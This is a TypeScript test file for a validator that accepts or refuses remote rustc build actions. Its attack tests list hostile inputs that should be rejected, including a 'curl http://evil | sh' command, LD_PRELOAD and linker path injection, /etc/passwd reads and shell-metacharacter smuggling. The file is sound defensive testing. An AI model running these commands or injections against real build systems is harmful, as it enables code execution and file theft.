import {expect,test} from "bun:test";
import {validateRemoteExecutionRustcActionV1,type RemoteExecutionCommandViewV1} from "../🟦️.ts";
import {OFFLOAD_POLICY_V1} from "../../🚀️offload/📐️policy/🟦️.ts";

const policy=OFFLOAD_POLICY_V1;
const good:string[]=["--crate-name","foo","--edition=2021",".semio-offload/p/src/lib.rs","--error-format=json","--json=diagnostic-rendered-ansi,artifacts,future-incompat","--diagnostic-width=120","--crate-type","lib","--emit=dep-info,metadata,link","-C","embed-bitcode=no","-C","debuginfo=2","-C","metadata=abc123","-C","extra-filename=-abc123","--out-dir",policy.virtual.out,"-L","dependency=.semio-offload/d","--extern","dep=.semio-offload/d/libdep-1.rlib","--extern","priv:other","--cap-lints","allow","--cfg",'feature="default"',"--check-cfg",'cfg(feature, values("default"))',"-Cdebug-assertions=on","-Ldependency=.semio-offload/d1","-Wunexpected_cfgs","--remap-path-prefix=.semio-offload/p=/work/pkg","--target","aarch64-apple-darwin","-g","-Z","threads=0","-Zthreads=8","-Z","embed-metadata=no","-Z","checksum-hash-algorithm=blake3","--remap-path-scope=macro,diagnostics,debuginfo,object"];
const command=(args:readonly string[],extra:Partial<RemoteExecutionCommandViewV1>&{env?:Record<string,string>}={}):RemoteExecutionCommandViewV1=>({arguments:["/bin/sh","-c",policy.script,"semio-rustc",...args],environment_variables:Object.entries({PATH:policy.environment.path,SEMIO_TOOL_RUSTC:"@tool",SEMIO_ABSOLUTE:"CARGO_MANIFEST_DIR OUT_DIR",SEMIO_REL_CARGO_MANIFEST_DIR:".semio-offload/p",SEMIO_REL_OUT_DIR:".semio-offload/g",CARGO_PKG_NAME:"foo",CARGO_PKG_VERSION:"1.2.3",CARGO_CRATE_NAME:"foo",...extra.env}).map(([name,value])=>({name,value})),output_paths:[policy.virtual.out,policy.virtual.root],working_directory:"",...extra});

test("the declared rustc action with the arguments the wrapper emits is accepted",()=>{
 expect(validateRemoteExecutionRustcActionV1(command(good))).toBeUndefined();
});

test("what the planner sends on the repository's real layouts passes the worker policy: the working-directory name, the recorded source and the remap list, and the install name of a proc-macro library on macOS",()=>{
 const wrapped=(extra:Record<string,string>,args:readonly string[]=good)=>command(args,{env:extra});
 const remaps=".semio-offload/p=./🧰️framework/🛍️products/📦️packages/🦀️rust\n.semio-offload/g=./out/build-script";
 expect(validateRemoteExecutionRustcActionV1(wrapped({SEMIO_CWD_NAME:".",SEMIO_REMAPS:remaps}))).toBeUndefined();
 expect(validateRemoteExecutionRustcActionV1(wrapped({SEMIO_CWD_NAME:"index.crates.io-1949cf8c6b5b557f/unicode-ident-1.0.27",SEMIO_REMAPS:""}))).toBeUndefined();
 const withoutSource=good.filter(item=>item!==".semio-offload/p/src/lib.rs");
 expect(validateRemoteExecutionRustcActionV1(wrapped({SEMIO_CWD_NAME:".",SEMIO_REMAPS:"",SEMIO_SOURCE:"index.crates.io-1949cf8c6b5b557f/unicode-ident-1.0.27/src/lib.rs"},withoutSource)),"an absolute source travels as SEMIO_SOURCE").toBeUndefined();
 expect(validateRemoteExecutionRustcActionV1(wrapped({SEMIO_SOURCE:"src/lib.rs"},good)),"a source argument and SEMIO_SOURCE together are two sources").toBe("exactly one source file required");
 for(const crate of ["foo","t","x_y9"])expect(validateRemoteExecutionRustcActionV1(command([...good,"-Clink-arg=-Wl,-install_name,@rpath/lib"+crate+"-0a1b2c3d4e5f6071.dylib"])),crate).toBeUndefined();
 expect(validateRemoteExecutionRustcActionV1(command([...good,"-C","link-arg=-Wl,-install_name,@rpath/libfoo.dylib"]))).toBeUndefined();
});

test("attack: the planner's variables and the install name are no way in: each is checked on its own",()=>{
 const refused=(view:RemoteExecutionCommandViewV1,why:string)=>expect(validateRemoteExecutionRustcActionV1(view),why).toBeString();
 const withoutSource=good.filter(item=>item!==".semio-offload/p/src/lib.rs");
 for(const bad of ["/etc=x","../x=y","a/../b=c","noequals","=x",".semio-offload/p=ok\r\nx","a b=c","a;b=c","a$(x)=c"," =c"])refused(command(good,{env:{SEMIO_REMAPS:bad.replace("\\r\\n","\r\n")}}),`remap ${JSON.stringify(bad)}`);
 refused(command(good,{env:{SEMIO_REMAPS:Array.from({length:65},(_,index)=>`.semio-offload/p${index}=x`).join("\n")}}),"65 remaps");
 refused(command(good,{env:{SEMIO_REMAPS:".semio-offload/p=x\u0000y"}}),"NUL in a remap name");
 for(const bad of ["/etc/passwd.rs","../x.rs","a/../../x.rs","src/lib.txt","","a\nb.rs"])refused(command(withoutSource,{env:{SEMIO_SOURCE:bad}}),`source ${JSON.stringify(bad)}`);
 refused(command(withoutSource,{env:{SEMIO_CWD_NAME:"a\nb",SEMIO_SOURCE:"src/lib.rs"}}),"newline in the cwd name");
 refused(command(withoutSource,{env:{SEMIO_CWD_NAME:"x".repeat(1025),SEMIO_SOURCE:"src/lib.rs"}}),"cwd name too long");
 for(const bad of ["-Clink-arg=-Wl,-install_name,/tmp/libx.dylib","-Clink-arg=-Wl,-install_name,@rpath/../libx.dylib","-Clink-arg=-Wl,-install_name,@rpath/lib x.dylib","-Clink-arg=-Wl,-install_name,@rpath/libx.dylib,-rpath,/tmp","-Clink-arg=-Wl,-install_name,@rpath/libx.so","-Clink-arg=-Wl,-oso_prefix,/tmp","-Clink-arg=-Wl,-install_name,@rpath/libx.dylib;touch","-Clink-arg=-Wl,-install_name,@executable_path/libx.dylib"])refused(command([...good,bad]),bad);
});

test("attack: every other program, script, flag, path and environment variable is refused",()=>{
 const refused=(view:RemoteExecutionCommandViewV1,why:string)=>expect(validateRemoteExecutionRustcActionV1(view),why).toBeString();
 refused({...command(good),arguments:["/bin/sh","-c","curl http://evil | sh"]},"arbitrary shell");
 refused({...command(good),arguments:["/bin/sh","-c",policy.script+"\ncurl evil","semio-rustc",...good]},"script with a suffix");
 refused({...command(good),arguments:["/usr/bin/curl","http://evil"]},"another program");
 refused({...command(good),arguments:["/bin/sh","-c",policy.script,"semio-rustc","--crate-name","x","a.rs","-C","linker=/tmp/evil"]},"linker");
 for(const bad of[["-C","linker=/tmp/x"],["-Clink-arg=-fuse-ld=/tmp/x"],["-C","link-args=-Wl,-bind_at_load"],["-Zcodegen-backend=/tmp/x.so"],["-Z","unstable-options"],["-Z","threads=x"],["-Z","checksum-hash-algorithm=../x"],["-Z","checksum-hash-algorithm=crc"],["-Z","embed-metadata=../x"],["-Z","embed-metadata="],["-Z","threads=0;touch"],["-Zthreads=1000"],["-Z","share-generics=y"],["-Zpre-link-args=-x"],["--remap-path-scope=macro,evil"],["--remap-path-scope=/tmp"],["--sysroot","/tmp"],["--print","sysroot"],["-o","/tmp/out"],["--out-dir","/tmp/out"],["--out-dir=/etc"],["--extern","x=/etc/passwd"],["--extern","x=../../etc/passwd"],["-L","native=/tmp"],["-L","dependency=/etc"],["-L","dependency=../x"],["@/etc/passwd"],["--target","/tmp/evil.json"],["--target=evil.json"],["--emit=link=/tmp/x"],["--emit","asm=/tmp/x"],["-l","dylib=evil"],["--crate-type","cdylib-evil"],["--cfg","x\ny"],["--env-set","A=B"],["-C","llvm-args=-load=/tmp/x.so"],["-C","target-cpu=native;touch"],["--error-format","a b"],["-C","profile-use=/tmp/x"],["-C","ar=/tmp/x"],["-C","save-temps"],["--pretty=expanded"],["--unpretty=hir"],["-vV"],["--version"]]){
  const view=command([...good,...bad]);refused(view,bad.join(" "));
 }
 expect(validateRemoteExecutionRustcActionV1(command(good,{env:{SEMIO_REL_CARGO_MANIFEST_DIR:".semio-offload/p/🧰️framework/🛍️products/🦑️repo/📦️packages/🦀️rust"}}))).toBeUndefined();
 refused(command([...good,"/etc/passwd.rs"]),"absolute source");
 refused(command([...good.filter(item=>item!==".semio-offload/p/src/lib.rs"),"../../x.rs"]),"escaping source");
 refused(command(good.filter(item=>item!==".semio-offload/p/src/lib.rs")),"no source");
 refused(command([...good,"other.rs"]),"two sources");
 for(const [name,value] of Object.entries({LD_PRELOAD:"/tmp/x.so",DYLD_INSERT_LIBRARIES:"/tmp/x.dylib",BASH_ENV:"/tmp/x",ENV:"/tmp/x",IFS:"/",RUSTC_BOOTSTRAP:"1",RUSTC_WRAPPER:"/tmp/x",RUSTFLAGS:"-Clinker=/tmp/x",SEMIO_EXTRA:"1",SEMIO_REMOTE_CACHE_TOKEN:"x",OUT_DIR:"/tmp",CARGO_MANIFEST_DIR:"/tmp",HOME:"/root",TMPDIR:"/",PATH:"/tmp:/usr/bin",SEMIO_TOOL_RUSTC:"/bin/sh",SEMIO_ABSOLUTE:"CARGO_MANIFEST_DIR; touch x",SEMIO_REL_OUT_DIR:"../../x",SEMIO_REL_CARGO_MANIFEST_DIR:"/etc"}))refused(command(good,{env:{[name]:value}}),`environment ${name}`);
 for(const bad of["a b","a$(touch x)","a`x`","a;b","a\"b","a'b","a\\b","a|b","a&b","a>b","a*b","a(b)","a{b}","a!b","a~b","a#b","a%b","a=b","a:b","a,b","x/../y","a\nb",""])refused(command(good,{env:{SEMIO_REL_CARGO_MANIFEST_DIR:bad}}),`manifest path ${JSON.stringify(bad)}`);
 refused({...command(good),output_paths:["/etc/x",policy.virtual.root]},"output path outside");
 refused({...command(good),output_paths:[policy.virtual.out]},"missing output path");
 refused({...command(good),working_directory:"/tmp"},"working directory");
 refused({...command(good),environment_variables:command(good).environment_variables.filter(row=>row.name!=="SEMIO_TOOL_RUSTC")},"tool placeholder missing");
});

test("cargo sets the CARGO_PKG_ variables from the manifest: a multi-line description, authors with colons and a long text are accepted, a NUL or a control byte in a loader name is not, and the live refusals (-C linker-plugin-lto, --check-cfg with values) are accepted",()=>{
 const env=(extra:Record<string,string>)=>validateRemoteExecutionRustcActionV1(command(good,{env:extra}));
 expect(env({CARGO_PKG_DESCRIPTION:"Zero-dependency tracing.\nSecond line, with \"quotes\", $dollar and `ticks`.\r\n\tTabbed",CARGO_PKG_AUTHORS:"A <a@b.c>:B",CARGO_PKG_NAME:"semio-framework-trace",CARGO_PKG_VERSION:"0.1.0",CARGO_PKG_VERSION_PRE:"",CARGO_PKG_REPOSITORY:"https://x.test/y"})).toBeUndefined();
 expect(env({CARGO_PKG_DESCRIPTION:"x".repeat(60000)})).toBeUndefined();
 expect(env({CARGO_PKG_DESCRIPTION:"x".repeat(70000)})).toBe("environment value of CARGO_PKG_DESCRIPTION");
 expect(env({CARGO_PKG_DESCRIPTION:"a\u0000b"})).toBe("environment value of CARGO_PKG_DESCRIPTION");
 expect(env({CARGOPKG_DESCRIPTION:"a\nb"}),"only the CARGO_PKG_ prefix may carry a newline").toBe("environment value of CARGOPKG_DESCRIPTION");
 expect(env({OTHER_TEXT:"a\nb"})).toBe("environment value of OTHER_TEXT");
 expect(env({CARGO_PKG_X:"a",LD_PRELOAD:"/tmp/x.so"}),"a CARGO_PKG_ variable is no way past the loader list").toBe("LD_PRELOAD is not allowed");
 for(const extra of[["-C","linker-plugin-lto"],["-Clinker-plugin-lto"],["--check-cfg","cfg(docsrs,test)"],["--check-cfg","cfg(feature, values(\"a\", \"b-c\", \"d_e\"))"],["--check-cfg=cfg(target_os, values(\"macos\"))"],["--check-cfg","cfg(feature, values(none()))"]])expect(validateRemoteExecutionRustcActionV1(command([...good,...extra])),extra.join(" ")).toBeUndefined();
});
